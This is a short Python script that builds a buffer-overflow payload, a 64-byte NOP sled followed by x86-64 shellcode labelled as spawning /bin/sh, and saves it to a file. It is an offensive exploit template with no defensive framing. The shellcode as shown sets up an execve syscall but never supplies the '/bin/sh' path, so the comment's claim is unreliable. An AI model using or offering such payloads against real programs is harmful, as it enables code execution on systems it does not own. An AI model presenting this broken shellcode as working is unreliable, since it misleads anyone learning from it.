import os

# NOP sled (NOP = 0x90)
nop_sled = b'\x90' * 64

# Shellcode to execute /bin/sh (example shellcode)
shellcode = b'\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\xb0\x3b\x0f\x05'

# Construct the payload
payload = nop_sled + shellcode

# Save the payload to a file
with open("payload.txt", "wb") as f:
    f.write(payload)
